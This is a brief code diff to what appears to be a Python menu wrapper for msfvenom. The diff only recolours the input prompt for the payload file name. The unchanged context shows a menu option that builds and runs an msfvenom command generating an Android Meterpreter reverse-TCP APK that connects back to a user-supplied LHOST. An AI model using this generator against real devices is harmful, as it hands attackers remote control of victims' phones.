@@ -87,7 +87,7 @@ def msfvenom():
         if select == "6":
             LHOST = input(TextColors.CRIMSON + "ENTER THE LHOST : "+ TextColors.ESET)
             LPORT = input(TextColors.CRIMSON + "ENTER THE LPORT : "+ TextColors.ESET)
-            NAME = input("ENTER THE PAYLOAD NAME (.apk) : ")
+            NAME = input(TextColors.CRIMSON + "ENTER THE PAYLOAD NAME (.apk) : "+ TextColors.ESET)
 
             command = f"msfvenom --platform android -p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -o {NAME}"
             os.system(command)
